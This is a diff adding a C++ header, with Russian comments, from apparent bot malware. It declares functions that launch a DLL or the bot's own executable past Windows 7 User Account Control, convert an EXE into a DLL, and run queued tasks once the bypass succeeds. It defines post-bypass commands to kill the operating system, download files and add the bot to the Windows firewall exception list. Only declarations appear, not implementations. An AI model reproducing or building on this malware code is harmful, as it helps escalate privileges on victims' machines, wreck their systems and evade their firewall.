@@ -1,0 +1,32 @@
+#ifndef UAC_bypassH
+#define UAC_bypassH
+
+#include <windows.h>
+
+#define UAC_BYPASS_MAGIC_RETURN_CODE 'PWND'
+
+//команды выполняемые после обхода уак
+const int UAC_CMD_KillOs = 1; 
+const int UAC_CMD_Download = 2;
+const int UAC_CMD_AddAllowed = 3; //добавление файла в список исключений виндового фаервола
+
+//запуск длл в обход UAC на Windows 7
+bool RunDllBypassUAC( const LPVOID module, int szModule, int method );
+
+//выставляет флаг IMAGE_FILE_DLL в модуле exe
+bool ConvertExeToDll( LPVOID module );
+
+//стартует бота в обход AUC, сам exe бота берется из автозагрузки
+//method - номер метода обхада уак (0 или 1),
+//функция в файл task_bypassuac.txt пишет значение task и args
+//когда бот запустится, то он проверит наличие этого файла и это будет признак запуска
+//после обхода UAC, в результате будут выполнены действия в зависимости от значений 
+//task и args.
+bool RunBotBypassUAC( int method, int task = 0, const char* args = 0 );
+//выполнение задачи после обхода уак, описание задачи находится в task_bypassuac.txt,
+//находящемся в рабочей папке бота.
+//Возвращает: 0 - файл задач был давно создан, скорее всего ранее UAC не обошли, но файл
+//остался, 1 - задача выполнена успешно, 2 - задача не выполнилась
+int ExecTaskAfterUAC();
+
+#endif //UAC_bypassH
